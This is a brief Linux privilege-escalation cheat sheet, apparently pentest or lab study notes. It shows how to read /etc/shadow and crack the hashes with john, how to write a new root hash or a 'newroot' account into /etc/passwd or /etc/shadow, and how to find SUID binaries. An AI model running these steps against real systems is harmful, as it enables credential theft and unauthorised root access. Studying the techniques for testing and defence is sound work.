### Weak File Permissions - Readable /etc/shadow

View the contents of the /etc/shadow file:

`cat /etc/shadow`

Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.

`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

### Weak File Permissions - Writable /etc/passwd

Generate a new password hash with a password of your choice:

`openssl passwd newpasswordhere`

Edit the */etc/passwd* file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").

Switch to the root user, using the new password:

`su root`

Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").

Now switch to the newroot user, using the new password:

`su newroot`

### Weak File Permissions - Writable /etc/shadow

Generate a new password hash with a password of your choice:

`mkpasswd -m sha-512 newpasswordhere`

Edit the */etc/shadow* file and replace the original root user's password hash with the one you just generated.


## Finding SUID Binaries

`find / -perm -u=s -type f 2>/dev/null`
`find / -perm -4000 -type f 2>/dev/null`
`find / -user root -perm -4000 -exec ls -ldb {} \;`


## Create hashed password for /etc/passwd

`openssl passwd -1 -salt my_salt my_password`